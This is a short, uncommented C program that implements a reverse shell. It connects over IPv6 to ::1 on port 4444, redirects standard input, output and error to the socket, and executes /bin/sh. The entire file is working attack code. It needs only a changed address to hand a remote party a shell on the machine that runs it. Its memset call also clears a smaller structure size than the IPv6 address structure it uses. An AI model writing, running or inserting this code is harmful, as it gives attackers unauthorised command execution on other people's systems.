#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>

int main()
{
	int s, c;
	int temp;
	struct sockaddr_in6 sa;
	char *argv[] = {"/bin/sh", NULL};
	s = socket(PF_INET6, SOCK_STREAM, 0);
	memset(&sa, 0, sizeof(struct sockaddr_in));
	
	sa.sin6_family = AF_INET6;
	sa.sin6_port = htons(4444);
	inet_pton(AF_INET6, "::1", 
          &(sa.sin6_addr));
	connect(s, (struct sockaddr *)&sa, sizeof(sa));

	dup2(s, 0);
	dup2(s, 1);
	dup2(s, 2);
	execve(argv[0], argv, NULL);
	return 0;
}
